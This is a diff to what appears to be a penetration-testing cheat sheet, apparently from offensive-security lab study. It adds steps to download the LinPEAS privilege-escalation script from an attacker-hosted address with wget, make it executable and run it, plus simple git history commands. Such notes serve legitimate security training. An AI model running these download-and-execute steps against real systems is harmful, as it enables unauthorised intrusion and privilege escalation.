@@ -60,6 +60,7 @@
 * [Microsoft Windows Library Files](#Microsoft-Windows-Library-Files)
 * [Mimikatz](#Mimikatz)
 * [LinPEAS](#LinPEAS)
+* [Git](#Git)
 * [Windows Privilege Escalation](#Windows-Privilege-Escalation)
   * [Enumerating Windows](#Enumerating-Windows)
   * [Leveraging Windows Services](#Leveraging-Windows-Services)
@@ -1096,6 +1097,30 @@ PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
 ~~~ bash
 cp /usr/share/peass/linpeas/linpeas.sh .
 python3 -m http.server 80
+~~~
+
+
+## Downloading linpeas and making it executable and execute
+
+~~~ bash
+wget http://192.168.119.5/linpeas.sh
+chmod a+x ./linpeas.sh
+./linpeas.sh
+~~~
+
+# Git
+
+## Examining the Git repository
+
+~~~ bash
+git status
+git log
+~~~
+
+## Displaying the differences between the two commits
+
+~~~ bash
+git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
 ~~~
 
 
